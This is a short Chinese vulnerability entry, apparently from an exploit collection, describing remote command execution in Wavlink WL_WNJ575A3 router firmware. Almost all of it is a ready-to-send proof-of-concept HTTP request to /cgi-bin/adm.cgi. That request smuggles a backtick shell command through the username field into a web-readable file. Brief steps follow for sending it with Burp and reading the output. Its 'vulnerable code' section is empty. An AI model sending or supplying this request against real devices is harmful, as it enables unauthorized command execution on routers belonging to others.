## 睿因 Wavlink WL_WNJ575A3 远程命令执行
影响版本

Wavlink WL_WNJ575A3 v.R75A3_V1410_220513

漏洞代码

POC
```
POST /cgi-bin/adm.cgi HTTP/1.1
Host: 192.168.10.1
Content-Length: 91
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.10.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/100.0.4896.60 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;
q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.10.1/set_time.shtml?r=29725
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=1243623152
Connection: close

page=sysAdm&SYSPASS=password&username='`ls>/etc_ro/lighttpd/www/data.html`'&newpass= 12345678


```
1.Burp 发包执行命令
2.访问“data.html”查看命令执行结
